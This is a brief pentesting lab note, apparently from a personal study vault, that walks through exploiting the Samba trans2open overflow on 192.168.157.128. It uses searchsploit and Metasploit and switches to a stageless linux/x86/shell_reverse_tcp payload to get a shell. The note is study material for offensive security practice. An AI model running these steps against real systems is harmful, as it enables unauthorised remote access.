# Attacking smb
---
- `searchsploit smb`
	- `Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)`
- `msfconsole`
	- search trans2open
	  ![[Pasted image 20250324161227.png]]
	- `use 1` => We know OS from nmap scan and http scan results
	- `set rhosts 192.168.157.128`
	- `exploit`
	- ==Exploit fails, as it is using staged payload by default==
	- `set payload linux/x86/shell_reverse_tcp` => stageless payload
	- `run` => Shell spawns successfully